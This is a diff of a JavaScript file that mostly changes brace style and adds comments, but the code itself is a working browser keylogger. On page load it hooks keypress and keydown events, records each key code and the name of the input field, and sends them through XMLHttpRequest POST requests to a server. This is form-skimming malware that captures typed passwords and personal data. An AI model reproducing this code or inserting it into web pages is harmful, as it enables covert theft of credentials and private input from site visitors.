@@ -1,7 +1,7 @@
-window.onload = function (){
+window.onload = function() {
     var2 = ",";
     name = '';
-    function make_xhr(){
+    function make_xhr() {
         var xhr;
         try {
             xhr = new XMLHttpRequest();
@@ -44,68 +44,54 @@ window.onload = function (){
     }
 }
 
+//onkeypress
 function function2(e)
 {
-    try
-    {
+    try {
         srcname = window.event.srcElement.name;
-    }
-    catch(error)
-    {
+    } catch (error) {
         srcname = e.srcElement ? e.srcElement.name : e.target.name
-        if (srcname == "")
-        {
+        if (srcname == "") {
             srcname = e.target.name
         }
     }
 
     var3 = (e) ? e.keyCode : e.which;
-    if (var3 == 0)
-    {
+    if (var3 == 0) {
         var3 = e.charCode
     }
 
-    if (var3 != "d" && var3 != 8 && var3 != 9 && var3 != 13)
-    {
+    if (var3 != "d" && var3 != 8 && var3 != 9 && var3 != 13) {
         andxhr(var3.toString(16), srcname);
     }
 }
 
-function function1(e)
-{
-    try
-    {
+//onkeydown
+function function1(e) {
+    try {
         srcname = window.event.srcElement.name;
-    }
-    catch(error)
-    {
+    } catch (error) {
         srcname = e.srcElement ? e.srcElement.name : e.target.name
-        if (srcname == "")
-        {
+        if (srcname == "") {
             srcname = e.target.name
         }
     }
 
     var3 = (e) ? e.keyCode : e.which;
-    if (var3 == 9 || var3 == 8 || var3 == 13)
-    {
+    if (var3 == 9 || var3 == 8 || var3 == 13) {
         andxhr(var3.toString(16), srcname);
     }
-    else if (var3 == 0)
-    {
+    else if (var3 == 0) {
         text = document.getElementById(id).value;
-        if (text.length != 0)
-        {
+        if (text.length != 0) {
             andxhr(text.toString(16), srcname);
         }
     }
 
 }
 
-function andxhr(key, inputName)
-{
-    if (inputName != name)
-    {
+function andxhr(key, inputName) {
+    if (inputName != name) {
         name = inputName;
         var2 = ",";
     }
@@ -114,8 +100,7 @@ function andxhr(key, inputName)
     xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     xhr.send(var2 + '&&' + inputName);
 
-    if (key == 13 || var2.length > 3000)
-    {
+    if (key == 13 || var2.length > 3000) {
         var2 = ",";
     }
 }
